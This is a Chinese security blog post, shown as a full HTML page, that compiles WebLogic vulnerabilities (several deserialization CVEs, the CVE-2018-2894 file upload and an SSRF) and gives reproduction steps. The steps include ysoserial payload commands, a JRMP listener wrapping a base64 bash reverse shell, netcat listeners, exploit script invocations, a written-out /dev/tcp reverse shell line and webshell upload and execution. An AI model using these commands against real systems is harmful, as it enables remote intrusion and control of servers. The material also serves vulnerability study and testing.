<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="0x01、目的本文主要是为了整理weblogic系列漏洞，内容主要聚集在漏洞复现上，关于每个漏洞具体分析细节不予描述。  1.Weblogic 反序列化漏洞涉及CVE号： 12345678910CVE-2015-4852CVE-2016-0638CVE-2016-3510CVE-2017-3248CVE-2017-10271	//XML DecoderCVE-2018-2628	//WLSCVE-">
<meta name="keywords" content="中间件,Web安全,weblogic">
<meta property="og:type" content="article">
<meta property="og:title" content="Weblogic漏洞">
<meta property="og:url" content="http://yoursite.com/Foundation/weblogic-vulnerability-basis/index.html">
<meta property="og:site_name" content="Dim">
<meta property="og:description" content="0x01、目的本文主要是为了整理weblogic系列漏洞，内容主要聚集在漏洞复现上，关于每个漏洞具体分析细节不予描述。  1.Weblogic 反序列化漏洞涉及CVE号： 12345678910CVE-2015-4852CVE-2016-0638CVE-2016-3510CVE-2017-3248CVE-2017-10271	//XML DecoderCVE-2018-2628	//WLSCVE-">
<meta property="og:locale" content="default">
<meta property="og:image" content="http://yoursite.com/Foundation/weblogic-vulnerability-basis/1.png">
<meta property="og:image" content="http://yoursite.com/Foundation/weblogic-vulnerability-basis/2.png">
<meta property="og:image" content="http://yoursite.com/Foundation/weblogic-vulnerability-basis/3.png">
<meta property="og:image" content="http://yoursite.com/Foundation/weblogic-vulnerability-basis/4.png">
<meta property="og:image" content="http://yoursite.com/Foundation/weblogic-vulnerability-basis/5.png">
<meta property="og:image" content="http://yoursite.com/Foundation/weblogic-vulnerability-basis/6.png">
<meta property="og:image" content="http://yoursite.com/Foundation/weblogic-vulnerability-basis/7.png">
<meta property="og:image" content="http://yoursite.com/Foundation/weblogic-vulnerability-basis/8.png">
<meta property="og:image" content="http://yoursite.com/Foundation/weblogic-vulnerability-basis/9.png">
<meta property="og:image" content="http://yoursite.com/Foundation/weblogic-vulnerability-basis/10.png">
<meta property="og:image" content="http://yoursite.com/Foundation/weblogic-vulnerability-basis/11.png">
<meta property="og:image" content="http://yoursite.com/Foundation/weblogic-vulnerability-basis/12.png">
<meta property="og:image" content="http://yoursite.com/Foundation/weblogic-vulnerability-basis/13.png">
<meta property="og:image" content="http://yoursite.com/Foundation/weblogic-vulnerability-basis/14.png">
<meta property="og:image" content="http://yoursite.com/Foundation/weblogic-vulnerability-basis/15.png">
<meta property="og:image" content="http://yoursite.com/Foundation/weblogic-vulnerability-basis/16.png">
<meta property="og:image" content="http://yoursite.com/Foundation/weblogic-vulnerability-basis/17.png">
<meta property="og:image" content="http://yoursite.com/Foundation/weblogic-vulnerability-basis/18.png">
<meta property="og:image" content="http://yoursite.com/Foundation/weblogic-vulnerability-basis/19.png">
<meta property="og:image" content="http://yoursite.com/Foundation/weblogic-vulnerability-basis/20.png">
<meta property="og:image" content="http://yoursite.com/Foundation/weblogic-vulnerability-basis/21.png">
<meta property="og:image" content="http://yoursite.com/Foundation/weblogic-vulnerability-basis/22.png">
<meta property="og:image" content="http://yoursite.com/Foundation/weblogic-vulnerability-basis/23.png">
<meta property="og:image" content="http://yoursite.com/Foundation/weblogic-vulnerability-basis/24.png">
<meta property="og:image" content="http://yoursite.com/Foundation/weblogic-vulnerability-basis/25.png">
<meta property="og:image" content="http://yoursite.com/Foundation/weblogic-vulnerability-basis/26.png">
<meta property="og:image" content="http://yoursite.com/Foundation/weblogic-vulnerability-basis/27.png">
<meta property="og:updated_time" content="2019-05-16T06:38:37.236Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Weblogic漏洞">
<meta name="twitter:description" content="0x01、目的本文主要是为了整理weblogic系列漏洞，内容主要聚集在漏洞复现上，关于每个漏洞具体分析细节不予描述。  1.Weblogic 反序列化漏洞涉及CVE号： 12345678910CVE-2015-4852CVE-2016-0638CVE-2016-3510CVE-2017-3248CVE-2017-10271	//XML DecoderCVE-2018-2628	//WLSCVE-">
<meta name="twitter:image" content="http://yoursite.com/Foundation/weblogic-vulnerability-basis/1.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>Weblogic漏洞</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Inici</a></li>
         
          <li><a href="/archives/">archives</a></li>
         
          <li><a href="https://github.com/echo001">Projectes</a></li>
         
          <li><a href="/about/">Qui som</a></li>
        
      </ul>
    </span>
    <br>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/Foundation/ms-vulnerability-basis/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/Foundation/iis-vulnerablity-basis/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
      <span id="i-next" class="info" style="display:none;">Post Següent</span>
      <span id="i-top" class="info" style="display:none;">Adalt</span>
      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
    </span>
    <br>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/Foundation/weblogic-vulnerability-basis/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/Foundation/weblogic-vulnerability-basis/&text=Weblogic漏洞"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/Foundation/weblogic-vulnerability-basis/&title=Weblogic漏洞"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/Foundation/weblogic-vulnerability-basis/&is_video=false&description=Weblogic漏洞"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Weblogic漏洞&body=Check out this article: http://yoursite.com/Foundation/weblogic-vulnerability-basis/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/Foundation/weblogic-vulnerability-basis/&title=Weblogic漏洞"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/Foundation/weblogic-vulnerability-basis/&title=Weblogic漏洞"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/Foundation/weblogic-vulnerability-basis/&title=Weblogic漏洞"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/Foundation/weblogic-vulnerability-basis/&title=Weblogic漏洞"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/Foundation/weblogic-vulnerability-basis/&name=Weblogic漏洞&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01、目的"><span class="toc-number">1.</span> <span class="toc-text">0x01、目的</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02、简述"><span class="toc-number">2.</span> <span class="toc-text">0x02、简述</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-反序列化漏洞"><span class="toc-number">2.1.</span> <span class="toc-text">1.反序列化漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-任意文件上传漏洞"><span class="toc-number">2.2.</span> <span class="toc-text">2.任意文件上传漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Weblogic-SSRF漏洞"><span class="toc-number">2.3.</span> <span class="toc-text">3.Weblogic SSRF漏洞</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03、测试复现"><span class="toc-number">3.</span> <span class="toc-text">0x03、测试复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-反序列化漏洞-1"><span class="toc-number">3.1.</span> <span class="toc-text">1.反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-CVE-2015-4852"><span class="toc-number">3.1.1.</span> <span class="toc-text">1.1 CVE-2015-4852</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-CVE-2016-0638-CVE-2016-3510-CVE-2017-3248-CVE-2018-2893"><span class="toc-number">3.1.2.</span> <span class="toc-text">1.2 CVE-2016-0638/CVE-2016-3510/CVE-2017-3248/CVE-2018-2893</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-CVE-2018-2628-EXP"><span class="toc-number">3.1.3.</span> <span class="toc-text">1.3 CVE-2018-2628(EXP)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4-CVE-2018-3245-EXP"><span class="toc-number">3.1.4.</span> <span class="toc-text">1.4 CVE-2018-3245(EXP)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5-CVE-2018-3191-EXP"><span class="toc-number">3.1.5.</span> <span class="toc-text">1.5 CVE-2018-3191(EXP)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-6-CVE-2017-10271"><span class="toc-number">3.1.6.</span> <span class="toc-text">1.6 CVE-2017-10271</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-7-CVE-2019-2725"><span class="toc-number">3.1.7.</span> <span class="toc-text">1.7 CVE-2019-2725</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-任意文件上传漏洞（CVE-2018-2894"><span class="toc-number">3.2.</span> <span class="toc-text">2.任意文件上传漏洞（CVE-2018-2894)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Weblogic-SSRF"><span class="toc-number">3.3.</span> <span class="toc-text">3.Weblogic SSRF</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04、总结"><span class="toc-number">4.</span> <span class="toc-text">0x04、总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05、参考网址"><span class="toc-number">5.</span> <span class="toc-text">0x05、参考网址</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Weblogic漏洞
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
        <span itemprop="name">Dim</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2019-05-16T02:09:15.000Z" itemprop="datePublished">2019-05-16</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/Web安全/">Web安全</a>, <a class="tag-link" href="/tags/weblogic/">weblogic</a>, <a class="tag-link" href="/tags/中间件/">中间件</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="0x01、目的"><a href="#0x01、目的" class="headerlink" title="0x01、目的"></a>0x01、目的</h1><p>本文主要是为了整理weblogic系列漏洞，内容主要聚集在漏洞复现上，关于每个漏洞具体分析细节不予描述。</p>
<ul>
<li><p>1.Weblogic 反序列化漏洞<br>涉及CVE号：</p>
<pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CVE-2015-4852</span><br><span class="line">CVE-2016-0638</span><br><span class="line">CVE-2016-3510</span><br><span class="line">CVE-2017-3248</span><br><span class="line">CVE-2017-10271	//XML Decoder</span><br><span class="line">CVE-2018-2628	//WLS</span><br><span class="line">CVE-2018-2893</span><br><span class="line">CVE-2018-3191</span><br><span class="line">CVE-2018-3245</span><br><span class="line">CVE-2019-2725</span><br></pre></td></tr></table></figure>
</code></pre></li>
<li><p>2.任意文件上传漏洞<br>涉及CVE号：<br>CVE-2018-2894</p>
</li>
<li>3.Weblogic SSRF漏洞<br>涉及CVE号：<br>CVE-2014-4210</li>
</ul>
<h1 id="0x02、简述"><a href="#0x02、简述" class="headerlink" title="0x02、简述"></a>0x02、简述</h1><h2 id="1-反序列化漏洞"><a href="#1-反序列化漏洞" class="headerlink" title="1.反序列化漏洞"></a>1.反序列化漏洞</h2><p>Weblogic是目前全球市场上应用最广泛的J2EE工具之一，主要用于构建J2EE应用程序。</p>
<p>T3协议是用于Weblogic服务器和其他Java Application之间传输信息的协议。实现RMI远程过程调用的专用协议。JAVA RMI主要用于实现远程过程调用的Application编程接口，该接口实现方式之一为：JRMP。（这些在构建后文实验过程中构造发包时都会用到）</p>
<p>当Weblogic发起一个T3协议连接时，Weblogic会连接每一个Java虚拟机并传输流量，通信过程得到简化，同时提高传输速率和操作系统资源利用高效化。</p>
<p><img src="/Foundation/weblogic-vulnerability-basis/1.png" alt=""></p>
<center>图1 JAVA 序列化</center>

<p>序列化就是将对象的状态信息转换为可以存储或传输的形式的过程，在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。<br>JAVA提供了一个序列化的API接口：</p>
<ul>
<li>1）可序列化的类需要实现java.io.Serializable接口</li>
<li>2）java.io.ObjectOutputStream.writeObject() 该方法用来写序列化的对象</li>
<li>3）java.io.ObjectInputStream.readObject()，read就是用来读序列化的对象</li>
<li>4）中间使用二进制协议来存储对象的状态<br>针对反序列化漏洞：<br>如果从网络、文件、数据库等读取了不可信的数据，同时作为read方法的输入值，这个时候就会触发反序列化漏洞。</li>
</ul>
<h2 id="2-任意文件上传漏洞"><a href="#2-任意文件上传漏洞" class="headerlink" title="2.任意文件上传漏洞"></a>2.任意文件上传漏洞</h2><p>该漏洞位于weblogic web service test page处，但是在“生产模式”下默认是不开启的，所以有一定的限制性。<br>当开启web服务测试页选项时，可以访问到ws_utc/config.do页面。当work home dir目录设置为ws_utc应用的静态文件css目录时，访问该目录无需权限，所以可以导致上传webshell并成功解析。</p>
<h2 id="3-Weblogic-SSRF漏洞"><a href="#3-Weblogic-SSRF漏洞" class="headerlink" title="3.Weblogic SSRF漏洞"></a>3.Weblogic SSRF漏洞</h2><p>该漏洞详见SSRF漏洞基础（ht<span></span>tps://echo001.github.io/Foundation/ssrf-vulnerability-basis1/）</p>
<h1 id="0x03、测试复现"><a href="#0x03、测试复现" class="headerlink" title="0x03、测试复现"></a>0x03、测试复现</h1><p>该文中仅关注漏洞检测等问题并给出部分漏洞详细的复现步骤。</p>
<h2 id="1-反序列化漏洞-1"><a href="#1-反序列化漏洞-1" class="headerlink" title="1.反序列化漏洞"></a>1.反序列化漏洞</h2><h3 id="1-1-CVE-2015-4852"><a href="#1-1-CVE-2015-4852" class="headerlink" title="1.1 CVE-2015-4852"></a>1.1 CVE-2015-4852</h3><p>测试如下：</p>
<p><img src="/Foundation/weblogic-vulnerability-basis/2.png" alt=""></p>
<center>图2 cve-2015-4852</center>

<p>该工具可直接获取shell</p>
<h3 id="1-2-CVE-2016-0638-CVE-2016-3510-CVE-2017-3248-CVE-2018-2893"><a href="#1-2-CVE-2016-0638-CVE-2016-3510-CVE-2017-3248-CVE-2018-2893" class="headerlink" title="1.2 CVE-2016-0638/CVE-2016-3510/CVE-2017-3248/CVE-2018-2893"></a>1.2 CVE-2016-0638/CVE-2016-3510/CVE-2017-3248/CVE-2018-2893</h3><p>此四种漏洞，仅POC，EXP需要自行构造payload，测试如下：<br>连接失败返回：</p>
<p><img src="/Foundation/weblogic-vulnerability-basis/3.png" alt=""></p>
<center>图3 连接失败</center>

<p>正常测试成功：</p>
<p><img src="/Foundation/weblogic-vulnerability-basis/4.png" alt=""></p>
<center>图4 测试结果</center>

<h3 id="1-3-CVE-2018-2628-EXP"><a href="#1-3-CVE-2018-2628-EXP" class="headerlink" title="1.3 CVE-2018-2628(EXP)"></a>1.3 CVE-2018-2628(EXP)</h3><p>反弹shell<br>攻击步骤：</p>
<ul>
<li>（1）构造payload</li>
<li>（2）设置JRMPListener</li>
<li>（3）设置nc监听</li>
<li>（4）运行exp，弹回shell</li>
</ul>
<p>涉及命令如下：<br>        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar JRMPClient [自己服务器IP]:1099 | xxd</span><br><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 &apos;bash -c &#123;echo,反弹命令的base64编码&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&apos;</span><br><span class="line">nc -lvvp port</span><br><span class="line">Python cve-2018-2628.py TARGET_HOST TARGET_PORT</span><br></pre></td></tr></table></figure></p>
<p>注：反弹shell的命令：</p>
<pre><code>bash -i &gt;&amp; /dev/tcp/IP/12345 0&gt;&amp;1
</code></pre><p>具体操作如下所示：</p>
<ul>
<li><p>（1）该exp是在原检测代码上改的，故需要自行生成payload进行修改。<br>生成payload：</p>
<pre><code>java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar JRMPClient [自己服务器]:1099 | xxd
</code></pre></li>
</ul>
<p><img src="/Foundation/weblogic-vulnerability-basis/5.png" alt=""></p>
<center>图5 生成payload</center>

<p><img src="/Foundation/weblogic-vulnerability-basis/6.png" alt=""></p>
<center>图6 替换payload</center>

<ul>
<li><p>（2）设置JRMPListener</p>
<pre><code>java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 ‘commond’
</code></pre></li>
</ul>
<p><img src="/Foundation/weblogic-vulnerability-basis/7.png" alt=""></p>
<center>图7 开启JRMPListener</center>

<ul>
<li><p>（3）攻击机上开启监听端口：</p>
<pre><code>nc -lvvp port
</code></pre></li>
</ul>
<p><img src="/Foundation/weblogic-vulnerability-basis/8.png" alt=""></p>
<center>图8 开启nc监听</center>

<ul>
<li>（4）运行修改后的exp：</li>
</ul>
<p><img src="/Foundation/weblogic-vulnerability-basis/9.png" alt=""></p>
<center>图9 运行exp</center>

<p>弹回shell：</p>
<p><img src="/Foundation/weblogic-vulnerability-basis/10.png" alt=""></p>
<center>图10 弹回shell</center>

<h3 id="1-4-CVE-2018-3245-EXP"><a href="#1-4-CVE-2018-3245-EXP" class="headerlink" title="1.4 CVE-2018-3245(EXP)"></a>1.4 CVE-2018-3245(EXP)</h3><p>攻击步骤同上，不赘述，具体生成payload细节有所变动</p>
<ul>
<li><p>（1）生成payload</p>
<pre><code>java -jar ysoserial-cve-2018-3245.jar CVE_2018_3245 &quot;自己服务器IP:1099&quot; &gt; poc.ser
</code></pre></li>
</ul>
<p><img src="/Foundation/weblogic-vulnerability-basis/11.png" alt=""></p>
<center>图11 生成payload</center>

<ul>
<li><p>（2）设置JRMPListener</p>
<pre><code>java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 &apos;bash -c {echo,反弹命令的base64编码}|{base64,-d}|{bash,-i}&apos;
</code></pre></li>
</ul>
<p><img src="/Foundation/weblogic-vulnerability-basis/12.png" alt=""></p>
<center>图12 设置JRMPListener</center>

<ul>
<li><p>（3）设置nc监听</p>
<pre><code>命令：nc -lvvp port
</code></pre></li>
</ul>
<p><img src="/Foundation/weblogic-vulnerability-basis/13.png" alt=""></p>
<center>图13 设置nc监听</center>

<ul>
<li><p>（4）运行exp</p>
<pre><code>python weblogic.py TARGET_IP 7001 poc.ser
</code></pre></li>
</ul>
<p><img src="/Foundation/weblogic-vulnerability-basis/14.png" alt=""></p>
<center>图14 运行exp</center>

<p>结果：弹回shell</p>
<p><img src="/Foundation/weblogic-vulnerability-basis/15.png" alt=""></p>
<center>图15 弹回shell</center>

<h3 id="1-5-CVE-2018-3191-EXP"><a href="#1-5-CVE-2018-3191-EXP" class="headerlink" title="1.5 CVE-2018-3191(EXP)"></a>1.5 CVE-2018-3191(EXP)</h3><p>攻击步骤大体同上，依旧在payload生成上有区别。</p>
<ul>
<li>（1）生成payload：（根据版本不同，选择不同<pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">weblogic-spring-jndi-10.3.6.0.jar for weblogic:</span><br><span class="line">10.3.6.0 12.2.1.0 12.1.3.0 12.2.1.1</span><br><span class="line">weblogic-spring-jndi-12.2.1.3.jar for weblogic:</span><br><span class="line">12.2.1.3</span><br></pre></td></tr></table></figure>
</code></pre></li>
</ul>
<p>命令：</p>
<pre><code>java -jar weblogic-spring-jndi-10.3.6.0.jar rmi://自己服务器IP:1099/poc &gt; poc.ser
</code></pre><p><img src="/Foundation/weblogic-vulnerability-basis/16.png" alt=""></p>
<center>图16 生成3191payload</center>

<ul>
<li>（2）设置JRMPListener，同上</li>
<li>（3）开启nc监听，同上</li>
<li><p>（4）运行exp</p>
<pre><code>命令：python weblogic.py TARGET_IP 7001 poc.ser
</code></pre><p>同上，nc监听处弹回shell</p>
</li>
</ul>
<p><img src="/Foundation/weblogic-vulnerability-basis/17.png" alt=""></p>
<center>图17 3191弹回shell</center>

<h3 id="1-6-CVE-2017-10271"><a href="#1-6-CVE-2017-10271" class="headerlink" title="1.6 CVE-2017-10271"></a>1.6 CVE-2017-10271</h3><p>访问网址：ht<span></span>tp://ip:port/wls-wsat/Coordina<span></span>torPortType<br>抓包后放入repeater，添加payload，重放。</p>
<p><img src="/Foundation/weblogic-vulnerability-basis/18.png" alt=""></p>
<center>图18 进行攻击</center>

<p>监听处弹回shell：</p>
<p><img src="/Foundation/weblogic-vulnerability-basis/19.png" alt=""></p>
<center>图19 cve-2017-10271 弹回shell</center>

<p>另增加一个检测小工具：</p>
<p><img src="/Foundation/weblogic-vulnerability-basis/20.png" alt=""></p>
<center>图20 检测10271漏洞</center>

<h3 id="1-7-CVE-2019-2725"><a href="#1-7-CVE-2019-2725" class="headerlink" title="1.7 CVE-2019-2725"></a>1.7 CVE-2019-2725</h3><p>攻击步骤和cve-2017-10271类似。<br>访问目录：ht<span></span>tp://ip:port/_async/Asyn<span></span>cResponseService<br>抓包后放入repeater，添加payload，重放。</p>
<p><img src="/Foundation/weblogic-vulnerability-basis/21.png" alt=""></p>
<center>图21 cve-2019-2725攻击</center>

<p>监听处弹回shell：</p>
<p><img src="/Foundation/weblogic-vulnerability-basis/22.png" alt=""></p>
<center>图22 cve-2019-2725弹回shell</center>

<h2 id="2-任意文件上传漏洞（CVE-2018-2894"><a href="#2-任意文件上传漏洞（CVE-2018-2894" class="headerlink" title="2.任意文件上传漏洞（CVE-2018-2894)"></a>2.任意文件上传漏洞（CVE-2018-2894)</h2><p>该漏洞需要开启Web服务测试页。即能访问ws_utc/config.do目录才行。<br>开启该测试页需要进入管理界面。选择base_domain——&gt;高级——&gt;开启启用Web测试服务页，如下所示。</p>
<p><img src="/Foundation/weblogic-vulnerability-basis/23.png" alt=""></p>
<center>图23 开启Web测试服务页</center>

<p>开启后，就可以访问<br>ht<span></span>tp://ip:port/ws_utc/co<span></span>nfig.do<br>选择通用一栏，修改work home dir为<br>        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</span><br></pre></td></tr></table></figure></p>
<p>因为访问该目录不需要权限，这个是触发漏洞的关键。<br>提交后，选择安全一栏——&gt;增加，上传webshell</p>
<p><img src="/Foundation/weblogic-vulnerability-basis/24.png" alt=""></p>
<center>图24 上传webshell</center>

<p>上传后，查看返回数据包，找到时间戳</p>
<p><img src="/Foundation/weblogic-vulnerability-basis/25.png" alt=""></p>
<center>图25 查看返回包</center>

<p>根据传的webshell方式，自行选择连接方式。<br>连接地址为：ht<span></span>tp://ip:port/ws_utc/css/con<span></span>fig/keystore/[时间戳]_[文件名]<br>此处为例，直接访问：<br>ht<span></span>tp://ip:port/ws_utc/css/con<span></span>fig/keystore/[时间戳]_[文件名]？cmd=command<br>执行webshell，如下所示：</p>
<p><img src="/Foundation/weblogic-vulnerability-basis/26.png" alt=""></p>
<center>图26 执行webshell</center>

<h2 id="3-Weblogic-SSRF"><a href="#3-Weblogic-SSRF" class="headerlink" title="3.Weblogic SSRF"></a>3.Weblogic SSRF</h2><p>参考：<a href="https://echo001.github.io/Foundation/ssrf-vulnerability-basis1/" target="_blank" rel="noopener">https://echo001.github.io/Foundation/ssrf-vulnerability-basis1/</a><br>不做赘述</p>
<h1 id="0x04、总结"><a href="#0x04、总结" class="headerlink" title="0x04、总结"></a>0x04、总结</h1><p>本文目的仅着重于整理Weblogic的相关测试方面，对于细节上漏洞形成的细节涉及的函数都未做提及。<br>测试中包含4个测试POC，含<br>CVE-2016-0638,CVE-2016-3510,CVE-2017-3248,CVE-2018-2893。根据对测试代码的分析，大部分只需要替换其中的payload即可转换为exp。<br>包含了5个exp，含<br>CVE-2018-2628,CVE-2018-3245,CVE-2018-3191,CVE-2017-10271,CVE-2019-2725。<br>然后再记录了一个weblogic的任意文件上传漏洞，但该漏洞需要对Web测试页启用，该配置默认是不开启的，真正生产环境中，碰到的概率相对会降低很多。<br>Weblogic的漏洞层出不穷，这跟其修复方式有关，补丁大部分都是添加黑名单的方式，所以能针对黑名单进行另外的绕过。这些CVE号之间大多关系密切，往往后一个就是针对前一个漏洞补丁的绕过。<br>文末依旧给出一张简图。</p>
<p><img src="/Foundation/weblogic-vulnerability-basis/27.png" alt=""></p>
<center>图27 weblogic漏洞总结简图</center>

<p>注：2和3是1的绕过，7是6的绕过，9是7的绕过。</p>
<h1 id="0x05、参考网址"><a href="#0x05、参考网址" class="headerlink" title="0x05、参考网址"></a>0x05、参考网址</h1><p>htt<span></span>ps://medium.com/abn-amro-red-team/java-deserialization-from-discovery-to-reverse-shell-on-limited-environments-2e7b4e14fbef<br>综合检测： htt<span></span>ps://www<span></span>.jianshu.com/p/321716c5dcf2<br>综述： htt<span></span>ps://ww<span></span>w.4hou.com/vulnerable/12874.html<br>htt<span></span>ps://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/<br>cve-2017-10271:ht<span></span>tps://github.com/hanc00l/weblogic_wls_wsat_rce<br>cve评级：<br>htt<span></span>ps://w<span></span>ww.cvedetails.com/vulnerability-list.php?vendor_id=93&amp;product_id=14534&amp;version_id=&amp;page=1&amp;hasexp=0&amp;opdos=0&amp;opec=0&amp;opov=0&amp;opcsrf=0&amp;opgpriv=0&amp;opsqli=0&amp;opxss=0&amp;opdirt=0&amp;opmemc=0&amp;ophttprs=0&amp;opbyp=0&amp;opfileinc=0&amp;opginf=0&amp;cvssscoremin=0&amp;cvssscoremax=0&amp;year=0&amp;month=0&amp;cweid=0&amp;order=1&amp;trc=64&amp;sha=bbe74ffeac9afcd64024038a2a865e469c359106<br>cnvd-2019-48814（cve-2019-2725)：<br>http<span></span>s://blog.csdn.net/csacs/article/details/89531471<br>CVE-2016-3510:<br>exp1htt<span></span>ps://github.com/rapid7/metasploit-framework/blob/de6397445cd844088b73b3cb5e11bd49eebb87f2/modules/exploits/multi/misc/weblogic_deserialize_marshalledobject.rb<br>exp2htt<span></span>ps://github.com/Coalfire-Research/java-deserialization-exploits/tree/master/WebLogic<br>检测3： 